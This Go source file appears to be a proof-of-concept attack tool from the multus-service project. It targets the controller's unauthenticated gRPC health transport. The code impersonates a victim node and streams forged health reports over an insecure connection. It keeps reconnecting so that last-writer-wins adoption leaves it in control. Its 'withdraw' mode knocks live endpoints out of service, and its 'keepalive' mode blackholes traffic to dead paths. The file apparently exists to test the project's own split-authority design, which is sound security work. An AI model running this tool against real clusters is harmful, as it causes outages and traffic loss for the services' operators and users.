// Command spoof is an adversary against the secondary-endpoint health transport.
//
// It is NOT a test harness. It models the threat the split-authority design has
// to answer: an ordinary workload with cluster network reachability to the
// controller's gRPC Service, holding no agent credential, forging health
// evidence for another node's endpoint.
//
// It exists to answer one question empirically -- can unauthenticated,
// self-asserted health evidence change what a Service resolves to? Everything
// it needs about the victim (attachment id, node, address) is derivable from
// objects any namespaced reader can see, so possessing them is not privilege.
//
// Two attacks:
//
//	withdraw   forge local_ready=false for a live endpoint  -> availability loss
//	keepalive  forge local+path ready=true for a dead path  -> traffic blackhole
//
// Both rest on the same flaw: the controller trusts the node name in the
// envelope, and the newest stream to (re)adopt a node wins. An attacker that
// reconnects faster than the real agent notices it was superseded stays
// authoritative for that node.
package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"

	healthpb "github.com/boanlab/multus-service/api/healthpb"
)

func main() {
	var (
		addr       = flag.String("addr", "", "controller health transport host:port")
		node       = flag.String("node", "", "victim node name to impersonate")
		attID      = flag.String("attachment", "", "victim attachment id")
		nad        = flag.String("nad", "", "victim canonical ns/name")
		iface      = flag.String("interface", "", "victim interface name")
		ip         = flag.String("ip", "", "victim address")
		attack     = flag.String("attack", "", "withdraw | keepalive")
		duration   = flag.Duration("duration", 30*time.Second, "how long to sustain the attack")
		sendEvery  = flag.Duration("send-interval", 100*time.Millisecond, "forged report cadence")
		instanceID = flag.String("instance", "attacker", "instance id base")
	)
	flag.Parse()
	for name, v := range map[string]string{"addr": *addr, "node": *node, "attachment": *attID,
		"nad": *nad, "interface": *iface, "ip": *ip, "attack": *attack} {
		if v == "" {
			fmt.Fprintf(os.Stderr, "--%s is required\n", name)
			os.Exit(2)
		}
	}

	var localReady, pathReady bool
	switch *attack {
	case "withdraw":
		localReady, pathReady = false, false // any false term withdraws the endpoint
	case "keepalive":
		localReady, pathReady = true, true // outvote the real agent's failure report
	default:
		fmt.Fprintf(os.Stderr, "unknown --attack %q\n", *attack)
		os.Exit(2)
	}

	ctx, cancel := context.WithTimeout(context.Background(), *duration)
	defer cancel()

	local := &healthpb.LocalHealth{
		AttachmentId: *attID, Nad: *nad, InterfaceName: *iface, Ip: *ip,
		LocalReady: localReady, InterfaceExists: localReady,
		AddressPresent: localReady, LinkUsable: localReady,
	}
	path := &healthpb.PathHealth{
		Scope:   healthpb.ProbeScope_PROBE_SCOPE_ENDPOINT,
		ScopeId: *attID, Nad: *nad, Target: "forged", PathReady: pathReady,
	}

	sends, accepted, epoch := 0, 0, 0
	for ctx.Err() == nil {
		epoch++
		// A fresh instance every reconnect. Adoption is last-writer-wins on the
		// node string, so reconnecting is how the attacker reclaims authority
		// after the real agent briefly supersedes it.
		inst := fmt.Sprintf("%s-%d", *instanceID, epoch)
		s, ok := session(ctx, *addr, *node, inst, local, path, *sendEvery, &sends, &accepted)
		if !ok {
			// dial failed; back off a touch and retry
			select {
			case <-ctx.Done():
			case <-time.After(200 * time.Millisecond):
			}
		}
		_ = s
	}
	fmt.Printf("attack=%s sends=%d accepted_acks=%d\n", *attack, sends, accepted)
}

// session opens one stream and keeps forging until it breaks or ctx ends.
func session(ctx context.Context, addr, node, inst string,
	local *healthpb.LocalHealth, path *healthpb.PathHealth,
	every time.Duration, sends, accepted *int) (bool, bool) {

	conn, err := grpc.NewClient(addr, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		return false, false
	}
	defer conn.Close()

	stream, err := healthpb.NewHealthReporterClient(conn).Sync(ctx)
	if err != nil {
		return false, false
	}

	go func() {
		for {
			if _, err := stream.Recv(); err != nil {
				return
			}
			*accepted++
		}
	}()

	var seq uint64
	send := func(p any) error {
		seq++
		e := &healthpb.HealthEnvelope{NodeName: node, AgentInstanceId: inst, Sequence: seq}
		switch v := p.(type) {
		case *healthpb.LocalHealth:
			e.Payload = &healthpb.HealthEnvelope_Local{Local: v}
		case *healthpb.PathHealth:
			e.Payload = &healthpb.HealthEnvelope_Path{Path: v}
		}
		return stream.Send(e)
	}

	t := time.NewTicker(every)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return true, true
		case <-t.C:
			local.ObservedAtUnixNano = time.Now().UnixNano()
			path.ObservedAtUnixNano = time.Now().UnixNano()
			if send(local) != nil {
				return true, false
			}
			if send(path) != nil {
				return true, false
			}
			*sends += 2
		}
	}
}
